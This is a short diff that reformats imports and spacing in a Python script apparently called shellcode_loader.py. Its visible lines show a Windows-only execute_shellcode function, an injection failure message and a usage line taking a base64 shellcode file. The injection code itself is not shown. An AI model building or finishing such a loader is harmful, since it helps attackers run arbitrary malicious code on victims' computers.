@@ -1,7 +1,7 @@
-
-import ctypes
 import base64
+import ctypes
 import platform
+
 
 def execute_shellcode(shellcode_bytes):
     if platform.system() != "Windows":
@@ -23,8 +23,10 @@ def execute_shellcode(shellcode_bytes):
         print(f"[!] Injection failed: {e}")
         return False
 
+
 if __name__ == "__main__":
     import sys
+
     if len(sys.argv) != 2:
         print("Usage: python shellcode_loader.py <base64_shellcode_file>")
         sys.exit(1)
